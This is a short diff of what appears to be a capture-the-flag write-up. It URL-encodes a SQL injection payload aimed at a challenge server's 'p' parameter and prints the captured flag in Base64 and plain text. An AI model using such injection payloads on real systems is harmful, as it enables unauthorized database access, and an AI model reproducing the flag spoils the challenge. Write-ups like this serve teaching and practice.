@@ -65,7 +65,7 @@ if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
 
 ## Payload :  
 ```
-http://52.59.124.14:5012/?p=2|0,1 OR title=‘Flag’
+http://52.59.124.14:5012/?p=2|0,1%20OR%20title=‘Flag’
 ```
 
 ### flag : RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvdyF9 <(Base64)> ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}
